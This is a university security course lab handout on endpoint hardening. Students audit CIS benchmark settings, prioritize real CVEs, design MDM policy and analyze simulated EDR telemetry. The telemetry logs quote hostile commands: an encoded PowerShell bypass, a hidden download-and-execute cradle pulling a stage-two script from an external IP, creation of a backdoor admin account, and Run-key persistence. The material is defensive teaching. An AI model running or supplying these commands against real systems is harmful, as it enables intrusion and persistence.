# Lab Activity — Module 08: Endpoint Security Analysis and Configuration

## CIS-4328 Information Security | Texas Wesleyan University

### CompTIA Security+ SY0-701 Alignment | Authorized Educational Use Only

---

## Lab Overview

**Lab Title:** Endpoint Security Assessment and Hardening Design

**Estimated Completion Time:** 90 minutes

**Submission:** Upload your completed deliverables to Canvas before the module deadline.

**Learning Objectives:**

- Evaluate an organization's endpoint security posture against CIS Benchmark principles.

- Design a patch prioritization strategy using CVSS scores and the CISA KEV catalog.

- Analyze EDR telemetry to reconstruct an attack timeline.

- Design an MDM policy for a BYOD scenario.

- Identify application allowlisting gaps and design an improvement.

---

## Background

This lab uses scenario-based analysis. No software is installed, no systems are modified, and all work is document-based. The analytical skills practiced here directly map to Security+ performance-based questions involving endpoint configuration and incident response.

---

## Part 1 — CIS Benchmark Audit (20 minutes)

### Part 1 Background

You have been asked to audit a Windows 10 workstation against selected CIS Benchmark Level 1 controls. The following table shows the CIS control description, the expected configuration, and the current configuration found on the system.

| Control | CIS Level 1 Requirement | Current Configuration | Compliant? |
|---|---|---|---|
| Screen lock timeout | Lock screen after 15 minutes of inactivity | Set to 60 minutes | ? |
| Guest account | Guest account disabled | Guest account enabled | ? |
| AutoRun | AutoRun disabled for all drives | AutoRun enabled | ? |
| Minimum password length | 14 characters minimum | 8 characters minimum | ? |
| Audit logon events | Audit success and failure | Audit disabled | ? |
| Remote Registry service | Disabled | Running | ? |
| Telnet client | Not installed | Installed | ? |

### Part 1 Tasks

1. Complete the Compliant column for each row.

2. For each non-compliant finding, write a brief explanation (two to three sentences) of the specific security risk the non-compliant configuration creates.

3. Rank the findings by severity from most critical to least critical. Justify your ranking based on the type of attack each misconfiguration enables or facilitates.

4. Two of the findings — AutoRun enabled and the Telnet client installed — are related to a specific attack technique covered in Module 04. Identify the attack technique and explain the connection.

5. What process control would ensure this workstation is checked against the benchmark regularly and that drift is detected automatically? Name the specific type of tool that performs this function.

### Part 1 Deliverable

Completed table with compliance column, written explanations for tasks 2 and 4, ranked findings list for task 3, and process control description for task 5.

---

## Part 2 — Patch Prioritization Exercise (20 minutes)

### Part 2 Background

Your organization's vulnerability scanner has produced the following findings. You must prioritize them for patching using CVSS scores and the CISA KEV catalog status.

| CVE | CVSS Score | Severity | KEV Catalog | Affected System | System Role |
|---|---|---|---|---|---|
| CVE-2021-44228 | 10.0 | Critical | Yes | App Server 01 | Internal Java application |
| CVE-2023-23397 | 9.8 | Critical | Yes | Exchange Server | Corporate email |
| CVE-2022-30190 | 7.8 | High | Yes | All workstations | Windows |
| CVE-2023-36884 | 8.8 | High | No | All workstations | Windows |
| CVE-2022-41040 | 8.8 | High | Yes | Exchange Server | Corporate email |
| CVE-2021-34527 | 8.8 | High | Yes | Print Spooler | Internal print server |
| CVE-2020-1472 | 10.0 | Critical | Yes | Domain Controller | Active Directory |

### Part 2 Tasks

1. Rank all seven CVEs by patching priority. Justify your ordering using the CVSS score and KEV catalog status for each.

2. CVE-2020-1472 (Zerologon) affects the domain controller. Explain why a domain controller vulnerability should receive special urgency considerations beyond the CVSS score alone.

3. CVE-2023-36884 has a High CVSS score but is NOT on the KEV catalog. Does this mean it should be deprioritized below CVE-2021-34527, which has the same CVSS score and is on the KEV catalog? Explain your reasoning.

4. Patching the Exchange Server requires a four-hour maintenance window that cannot be scheduled for two weeks. CVE-2023-23397 is on the KEV catalog and affects Outlook. What compensating controls would you implement for the two-week period before the patch can be applied?

5. Write a one-paragraph patch management policy statement for this organization that incorporates CVSS thresholds and KEV catalog guidance into a defined patching cadence.

### Part 2 Deliverable

Prioritized CVE table with justifications, written answers to tasks 2 and 3, compensating controls for task 4, and policy statement for task 5.

---

## Part 3 — EDR Telemetry Analysis (25 minutes)

### Part 3 Background

Your organization's EDR platform has captured the following telemetry from a Windows workstation during an incident. Events are listed in chronological order.

```text
[08:14:22] Process: outlook.exe spawned child process winword.exe
[08:14:31] Process: winword.exe opened file: Invoice_Q3.docm
[08:14:35] Process: winword.exe spawned child process cmd.exe
[08:14:36] Process: cmd.exe executed: powershell.exe -exec bypass -enc <base64>
[08:14:38] Network: powershell.exe connected to 91.198.174.55:443 (outbound)
[08:14:42] File: powershell.exe wrote file C:\Users\user\AppData\Temp\svcs.exe
[08:14:43] Process: svcs.exe executed
[08:15:01] Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run value added: svcs.exe
[08:15:15] Network: svcs.exe connected to 185.220.101.47:443 (outbound HTTPS, repeating every 60 seconds)
[09:43:17] Process: svcs.exe executed net.exe user admin2 Password123! /add
[09:43:18] Process: svcs.exe executed net.exe localgroup administrators admin2 /add
[09:44:02] Network: svcs.exe initiated SMB connection to 10.0.2.15 (file server)
```

### Part 3 Tasks

1. Reconstruct the attack timeline in plain language. Describe what happened at each stage without technical jargon — write it as you would for a non-technical executive summary.

2. Map each significant event to a MITRE ATT&CK tactic. You do not need to provide technique IDs — just the tactic name (Initial Access, Execution, Persistence, Command and Control, etc.).

3. The base64-encoded PowerShell command at 08:14:36 is a common obfuscation technique. Why do attackers use base64 encoding for PowerShell commands? What detection technique in the EDR would flag this behavior?

4. At 08:15:15, svcs.exe begins connecting to 185.220.101.47 every 60 seconds. What is this activity called, and what is its purpose in the attack? What network-level control from Module 07 could have detected or prevented this communication?

5. What is the earliest point in this timeline where the attack could have been stopped by a properly configured endpoint security control? Identify the control and explain what it would have done.

### Part 3 Deliverable

Written executive summary for task 1, MITRE tactic mapping table for task 2, and written answers for tasks 3, 4, and 5.

---

## Part 4 — MDM Policy Design (25 minutes)

### Part 4 Background

A professional services firm with 300 employees has approved a BYOD policy for mobile devices. Employees may use personal iPhones and Android devices to access corporate email (Microsoft 365), the HR portal, and a project management application (Asana). The firm handles client financial data subject to SOC 2 requirements.

### Part 4 Tasks

1. Recommend MDM or MAM for this scenario and justify your choice. Consider both the security requirements and the employee privacy implications.

2. Design a mobile security policy for this organization. Your policy must address the following requirements: screen lock enforcement, minimum OS version, encryption requirement, remote wipe capability (corporate data only), application restrictions, and VPN requirements for accessing internal systems. For each requirement, specify the control and its technical implementation via MDM/MAM.

3. An employee whose device is enrolled in the MAM program is terminated for cause. The security team suspects the employee may have copied client financial data to personal storage. Describe the steps the security team should take using MDM/MAM capabilities. What can they do, and what are the limitations of MAM in this scenario?

4. Some employees object to any MDM or MAM enrollment, citing privacy concerns. They refuse to enroll their devices. What are the organization's options? Evaluate each option in terms of security effectiveness and employee relations impact.

### Part 4 Deliverable

Written justification for task 1, a policy table for task 2 (requirement, control, technical implementation), written response for task 3, and written evaluation of options for task 4.

---

## Lab Submission Checklist

Before submitting, verify:

- Part 1: Completed compliance table, written explanations, ranked findings, and process control description.

- Part 2: Prioritized CVE table, written answers for tasks 2 and 3, compensating controls for task 4, and policy statement for task 5.

- Part 3: Executive summary, MITRE tactic table, and written answers for tasks 3, 4, and 5.

- Part 4: Justification for task 1, policy table for task 2, written responses for tasks 3 and 4.

---

## Part 9 — Challenge Exercise

### Challenge 1: EDR Telemetry Deep Dive and MITRE ATT&CK Mapping

A healthcare organization's EDR platform has flagged a suspicious sequence of events on a clinical workstation. The workstation belongs to a nurse in the oncology ward and is used to access the EHR system. The following telemetry was captured over a 45-minute period.

```text
[07:22:14] Process: chrome.exe visited http://update-adobeflash.net/install.php
[07:22:31] File: chrome.exe wrote C:\Users\nurse01\Downloads\AdobeUpdate.exe
[07:22:45] Process: AdobeUpdate.exe executed
[07:22:46] Process: AdobeUpdate.exe spawned cmd.exe
[07:22:47] Process: cmd.exe executed: powershell -w hidden -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.12/stage2.ps1')"
[07:23:01] Network: powershell.exe connected to 185.220.101.12:80 (outbound)
[07:23:04] File: powershell.exe wrote C:\Windows\Temp\winupd.exe
[07:23:05] Process: winupd.exe executed
[07:23:41] Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run added value: winupd.exe
[07:24:00] Network: winupd.exe connected to 91.199.212.44:443 (outbound, repeating every 120 seconds)
[07:48:32] Process: winupd.exe executed: whoami, ipconfig /all, net user, net localgroup administrators
[07:49:15] Process: winupd.exe executed: net use \\10.0.5.22\C$ /user:DOMAIN\admin <password>
[07:49:18] Network: winupd.exe initiated SMB connection to 10.0.5.22 (EHR application server)
```

1. Reconstruct the complete attack chain in plain English as an executive summary (five to eight sentences). Identify the likely initial access vector, the delivery mechanism, and the attacker's apparent objective based on the final events in the telemetry.

2. Map each event group to the corresponding MITRE ATT&CK tactic and a specific technique name (technique IDs are not required). Present your mapping in a table with columns for Time Range, MITRE Tactic, Technique Name, and Evidence from Telemetry.

3. HIPAA Security Rule § 164.312(b) requires audit controls that record and examine activity in systems containing electronic protected health information (ePHI). The attacker reached the EHR application server at 07:49:18. Identify three specific pieces of information the EDR telemetry provides that a traditional Windows event log would NOT have captured, and explain why each is valuable for the HIPAA-required audit and breach notification analysis.

4. The organization's security team wants to implement three endpoint controls that would have broken this attack chain at the earliest possible point. For each control, identify: the specific telemetry event it would have prevented, the control name and mechanism, and whether it is a preventive or detective control.

### Challenge 2: Endpoint Hardening Program Design

A regional bank with 450 employees is conducting its annual security program review. An external assessment identified the following endpoint security gaps across their Windows 10 fleet of 300 workstations and 80 servers.

- No centralized patch management — individual workstations self-update; servers are patched manually on an ad-hoc basis.
- CIS Benchmark compliance has never been assessed; there is no baseline configuration standard.
- Antivirus signatures are updated weekly via scheduled task; no behavioral detection or EDR is deployed.
- Full disk encryption is not deployed on workstations; laptops are issued to 60 remote employees.
- Mobile devices access corporate email via ActiveSync with no MDM or MAM enrollment required.
- Application allowlisting is not in place; employees can install and run any software.

1. The bank must comply with GLBA (Gramm-Leach-Bliley Act) Safeguards Rule, which requires a written information security program including risk assessment and safeguards. For each of the six gaps listed, identify: the specific GLBA Safeguards Rule section that applies, the risk the gap creates to customer financial data, and the specific technical control that remediates it.

2. The bank's IT team of four must implement all six controls within a 12-month budget cycle. Prioritize the six remediations into three tiers (immediate — 0 to 90 days, near-term — 90 to 180 days, long-term — 180 to 365 days). For each tier, justify the placement of each control using risk impact and implementation complexity.

3. For the 60 remote employees with laptops, design a complete endpoint security standard. Your standard must address: full disk encryption configuration (BitLocker with TPM + PIN or TPM-only — justify which), VPN requirements, EDR agent deployment, patch enforcement for off-network devices, and the MDM or MAM model for their corporate smartphones. For each requirement, specify the technical implementation.

4. After implementing EDR across all 300 workstations, the bank's security team estimates they will receive 150 to 200 EDR alerts per day. With two analysts working eight-hour shifts, describe a triage and escalation workflow that allows the team to process all alerts without alert fatigue. Your workflow must include: alert severity tiering criteria, automated response actions for high-confidence detections, escalation criteria for analyst review, and a metric the team should track weekly to measure the program's effectiveness.

### Reflection Questions

1. After completing both challenges, explain why the combination of application allowlisting and EDR provides stronger protection than either control alone. Specifically, describe the attack category that allowlisting prevents that EDR would only detect after execution, the attack category that EDR detects that allowlisting cannot prevent (because the malicious activity uses trusted, allowlisted binaries), and why the defense-in-depth principle requires both controls rather than choosing the "better" one.

2. In Challenge 2, you designed a patch management program for a bank with a small IT team. A security manager argues that deploying EDR should be prioritized over patching because EDR can detect exploitation of unpatched vulnerabilities. Identify two specific attack scenarios where EDR would fail to prevent a breach even if deployed, and use these scenarios to explain why patch management remains a foundational control that behavioral detection cannot replace.

---

Module 08 Lab — End
